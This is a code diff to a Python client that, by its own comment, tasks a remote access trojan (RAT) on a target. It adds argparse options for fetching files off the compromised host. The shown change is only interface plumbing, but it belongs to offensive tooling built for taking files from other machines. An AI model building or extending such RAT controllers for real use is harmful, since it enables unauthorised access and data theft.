@@ -3,6 +3,7 @@
 # Serves as the main CMD client interface which will provide tasking to our RAT on target
 
 import socket
+import argparse
 from RAT_Py_GetFile import *
 #from scapy.all import * # switch from socket to scapy for custom TCP packets
 
@@ -79,6 +80,11 @@ def handleInput():
     userInput = 1
     while (int(userInput) != EXIT):
         printHelp()
+
+
+       
+
+        
         userInput = input("> ")
         # add ip and port num to pass
 
@@ -94,16 +100,37 @@ def handleInput():
             putFile(sock, filepath, filename, overwrite)
 
         elif (int(userInput) == GET):
-            filepath= input("Please input filepath > ")
-            outfilepath = input("Please input filename (if not provided will use source file name) > ")
-            overwrite = input("Would you like to overwrite existing file on host? > ")
-            filepath = bytes(filepath, 'utf-8')
 
+            user_input = input("> ")
+             # play around with argparse 
+            parser = argparse.ArgumentParser(description='Perform a get file off target')
+            parser.add_argument('-filepath', '--filepath', type=str, help='Path to file to get on target', action='store', required=True)
+            parser.add_argument('-outfilepath', '--outfilepath', type=str, help='Path to output file write on local machine', action='store', required=True)
+            parser.add_argument('-overwrite','--overwrite', help="Whether to overwrite an existing file of the same name on the local machine", action='store_true', required=False)
+            args = parser.parse_args(user_input.split())
+            print(args)
+
+
+
+            
+            #filepath= input("Please input filepath > ")
+            #outfilepath = input("Please input filename (if not provided will use source file name) > ")
+            #overwrite = input("Would you like to overwrite existing file on host? > ")
+            
+            filepath = bytes(args.filepath, 'utf-8')
+            outfilepath = args.outfilepath
+
+            '''
             if (overwrite.lower() == "yes" or overwrite.lower() == "y"):
                 overwrite = True
             else:
                 overwrite = False
-
+            '''
+            if (args.overwrite):
+                overwrite = True
+            else:
+                overwrite = False
+            
             getFile(sock, filepath, outfilepath, overwrite)
 
     return
